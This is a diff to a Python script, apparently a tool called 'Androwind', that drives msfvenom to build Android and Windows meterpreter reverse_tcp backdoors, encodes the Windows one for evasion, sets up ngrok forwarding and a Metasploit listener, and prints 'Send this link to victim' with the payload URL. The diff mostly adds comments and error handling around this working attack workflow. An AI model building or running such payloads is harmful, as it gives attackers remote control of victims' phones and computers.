@@ -19,7 +19,7 @@ GREEN = "[\033[92m◉\033[0m]"
 ip = ""
 port = ""
 filename = ""
-APrompt = "\033[95mAndrowind ~# \033[0m"
+APrompt = "\033[95mAndrowind ~#\033[0m"
 ng_ins = f'''\n{GREEN} Signup: https://dashboard.ngrok.com/signup \n{GREEN} Login: https://dashboard.ngrok.com/login\n'''
 
 #Payload for Android
@@ -49,6 +49,7 @@ def logo():
     '''.center(os.get_terminal_size().columns)
     print(f"{logo}")
 
+#Create a directory /tmp/payload
 def __directory__():
     if not os.path.exists(PATH_OF_PAYLOAD):
         animation = ("\/-\\")
@@ -60,6 +61,7 @@ def __directory__():
         print("\n" + blue_plus + " Directory has been created \n")
         print("")
 
+#Start the apache2 server
 def __apache__():
     animation = ("\/-\\")
     for i in range(10):
@@ -70,13 +72,19 @@ def __apache__():
     print("\n" + blue_plus + " Server has been started \n")
     print("")
 
+#set local_ip and port automatically
 def __default__(ip, port):
-    __animation__()
-    print("\n" + blue_plus + " set IP = > ", ip)
-    print(blue_plus + " set Port = > ", port)
-    return ip, port
 
-#Android payload
+    __animation__()
+    try:
+        print("\n" + blue_plus + " set IP = > ", ip)
+        print(blue_plus + " set Port = > ", port)
+        return ip, port
+
+    except Exception as ex:
+        print("Exception: %s " %str(ex))
+
+#Create Android payload
 def venom_andro(ip, port, filename):
     try:
         os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
@@ -86,8 +94,8 @@ def venom_andro(ip, port, filename):
         print(blue_plus + " Backdoor Uploaded \n")
     except Exception as ex:
         print("Exception: %s" % str(ex))
-#Payload for Windows
 
+#Create Payload for Windows
 def venom_window(ip, port, filename):
     try:
         os.system(f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 20 -f exe -o /tmp/payload/{filename}.exe')
@@ -98,22 +106,38 @@ def venom_window(ip, port, filename):
     except Exception as ex:
         print("Exception: %s " % str(ex))
 
-#metasploit
+#Start metasploit and execute systemHandler.r to set PAYLOAD, IP address, PORT no automatically
 def msfconsole():
-    print(red_ex + "Starting msfconsole..")
-    os.system("xterm -T Metasploit -e msfconsole -q -r systemHandler.r")
-    os.system("rm systemHandler.r")
+    print(GREEN + " Starting msfconsole..")
+    try:
+        os.system("xterm -T Metasploit -e msfconsole -q -r systemHandler.r")
+        os.system("rm systemHandler.r && rm -rf /root/.ngrok2/ && rm -rf /tmp/payload/")
+        print("Done. Good Bye!")
+    except Exception as ex:
+        print("Exception: %s " %str(ex))
 
+#it create systemHandler.r file for metasploit
 def metaConfig(ip, port):
-    f = open("systemHandler.r", "w+")
-    f.write("use exploit/multi/handler\n")
-    f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
-    f.write(f"set LHOST {ip}\n")
-    f.write(f"set LPORT {port}\n")
+    try:
+        f = open("systemHandler.r", "w+")
+        f.write("use exploit/multi/handler\n")
+        f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
+        f.write(f"set LHOST {ip}\n")
+        f.write(f"set LPORT {port}\n")
 
+    except Exception as ex:
+        print("Exception: %s " %str(ex))
+
+#it display content of systemHandler file.. change ip and port if you want on xterm window.
+# CTRl + S to save file and CTRL + X to go further
 def systemHandler():
-    os.system("xterm -T Metasploit -e nano systemHandler.r")
+    try:
+        os.system("xterm -T Metasploit -e nano systemHandler.r")
 
+    except Exception as ex:
+        print("Exception: %s " %str(ex))
+
+#It will copy ngrok in /usr/local/bin to make an executeable
 def ngrok():
     animation = ("\/-\\")
     for i in range(10):
@@ -124,6 +148,7 @@ def ngrok():
     print("\n" + blue_plus + " Ngrok installed \n")
     print("")
 
+#it configure ngrok for portforwaring for multiple sessions HTTP and TCP
 def ngConfig():
     path = "/root/.ngrok2"
     animation = ("\/-\\")
@@ -132,13 +157,18 @@ def ngConfig():
         sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Configuring ngrok.yml file..")
         sys.stdout.flush()
     if not os.path.exists(path):
-        os.system(f"mkdir /root/.ngrok2 && cp ngrok.yml /root/.ngrok2/")
-        token = input("\n" + ng_ins + "\n" + red_ex + " Enter your token:")
-        os.system(f"ngrok authtoken {token}")
+
+        try:
+            os.system(f"mkdir /root/.ngrok2 && cp -f ngrok.yml /root/.ngrok2/")
+
+        except Exception as ex:
+            print("Exception: %s " %str(ex))
+
     print("\n" + blue_plus + " Configurations done")
     print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m ngrok start --all \033[0m")
     print("")
 
+#main
 def main():
     logo()
     __apache__()
@@ -149,40 +179,62 @@ def main():
     #input from user
     choice = input(GREEN + "\033[91mSet default IP for LAN OR press n for set custom IP and PORT for WAN \033[0m\n" + red_ex + " Set default IP and Port no [Y/n]: ")
     if choice[0].upper() == 'Y':
-        ip =   ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-        port = 4444
-        __default__(ip,port)
-        filename = input("\n" + red_ex + " Enter filename without extension: ")
-        print(blue_plus + " set Filename = > ", filename)
+
+        try:
+            ip =   ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            port = 4444
+            __default__(ip,port)
+            filename = input("\n" + red_ex + " Enter filename without extension: ")
+            print(blue_plus + " set Filename = > ", filename)
+
+        except Exception as ex:
+            print("Exception: %s " %str(ex))
     else:
-        ip = input("\n" + red_ex + " Enter your ip address: ")
-        print(blue_plus + " set IP = > ", ip)
-        port = input("\n" + red_ex + " Enter port no: ")
-        print(blue_plus + " set Port no = > ", port)
-        filename = input("\n" + red_ex + " Enter filename without extension: ")
-        print(blue_plus + " set Filename = > ", filename)
+
+        try:
+            ip = input("\n" + red_ex + " Enter your ip address: ")
+            print(blue_plus + " set IP = > ", ip)
+            port = input("\n" + red_ex + " Enter port no: ")
+            print(blue_plus + " set Port no = > ", port)
+            filename = input("\n" + red_ex + " Enter filename without extension: ")
+            print(blue_plus + " set Filename = > ", filename)
+
+        except Exception as ex:
+            print("Exception: %s " %str(ex))
 
     ch = int(input("\n[1] Android Payload \n[2] Windows Payload \n\n" +  APrompt ))
     if ch == 1:
-        venom_andro(ip, port, filename)
-        print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
-        msf = input(red_ex + " Metasploit = > [Y/n]: ")
-        if msf[0].upper() == 'Y':
-            print(red_ex + " Config payload..")
-            metaConfig(ip, port)
-            systemHandler()
-            msfconsole()
+
+        try:
+            venom_andro(ip, port, filename)
+            print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
+            msf = input(red_ex + " Metasploit = > [Y/n]: ")
+            if msf[0].upper() == 'Y':
+                print(red_ex + " Config payload..")
+                metaConfig(ip, port)
+                systemHandler()
+                msfconsole()
+
+        except Exception as ex:
+            print("Exception: %s " %str(ex))
+
         else:
             print(blue_plus + " PAYLOAD SAVED: " + f"{PATH_OF_PAYLOAD}" +"/"+ f"{filename}")
     elif ch == 2:
-        venom_window(ip, port, filename)
-        print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
-        msf = input(red_ex + " Metasploit = > [Yes/No]: ")
-        if msf[0].upper() == 'Y':
-            print(blue_plus + " Config payload..")
-            metaConfig(ip, port)
-            systemHandler()
-            msfconsole()
+
+        try:
+            venom_window(ip, port, filename)
+            print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
+            msf = input(red_ex + " Metasploit = > [Yes/No]: ")
+            if msf[0].upper() == 'Y':
+                print(blue_plus + " Config payload..")
+                metaConfig(ip, port)
+                systemHandler()
+                msfconsole()
+
+        except Exception as ex:
+            print("Exception: %s " %str(ex))
+
         else:
             print(blue_plus + " PAYLOAD SAVED: " + f"{PATH_OF_PAYLOAD}" +"/"+ f"{filename}")
 
